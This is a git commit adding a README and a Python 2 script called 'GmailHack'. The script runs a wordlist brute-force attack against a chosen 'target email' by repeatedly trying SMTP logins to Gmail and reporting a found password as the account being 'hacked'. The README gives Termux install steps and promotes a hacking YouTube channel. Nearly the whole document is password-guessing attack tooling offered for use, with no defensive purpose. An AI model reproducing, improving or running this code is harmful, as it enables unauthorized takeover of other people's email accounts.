01f010ec33652b7a2baa64650d20ed2f7c38c387
VPPHacker <48642846+vpphacker@users.noreply.github.com>
2019-05-26 11:55:40 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,27 @@
+﻿This tool do Brute Force attack on your Given email 📧 account.
+Installation :
+
+Termux 
+
+$ apt install git 
+
+$ apt install python2
+
+$ apt update 
+
+$ git clone https://github.com/vpphacker/GmailHack
+
+$ cd GmailHack 
+
+$ chmod +x *
+
+$ python2 gmailhack.py
+
+This tool will gide you 
+
+
+Support us by Subscribing channel 👇
+
+https://www.youtube.com/channel/UCIQ5wO7zmPmjnIBm1d_fGKw
+
+And for more Hacking Tutorials
---
+++ gmailhack.py
@@ -0,0 +1,55 @@
+#!/usr/bin/python
+'''create by VPP Hacker'''
+
+import smtplib
+from os import system
+
+def main():
+   print """
+  ____                 _ _ _   _            _
+ / ___|_ __ ___   __ _(_) | | | | __ _  ___| | __
+| |  _| '_ ` _ \ / _` | | | |_| |/ _` |/ __| |/ /
+| |_| | | | | | | (_| | | |  _  | (_| | (__|   <
+ \____|_| |_| |_|\__,_|_|_|_| |_|\__,_|\___|_|\_\ """
+   print '================================================='
+   print '               create by VPP Hacker              '
+   print '           Subscribe Our YouTube Channel         '
+   print '================================================='
+
+main()
+print '[1] start the attack'
+print '[2] exit'
+option = input('Enter Option =>')
+if option == 1:
+   file_path = raw_input('Enter Password list :')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('target email :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print '[+] this account has been hacked, password :' + password + '     ^_^'
+
+            break
+         else:
+            print '[!] password not found => ' + password
+login()
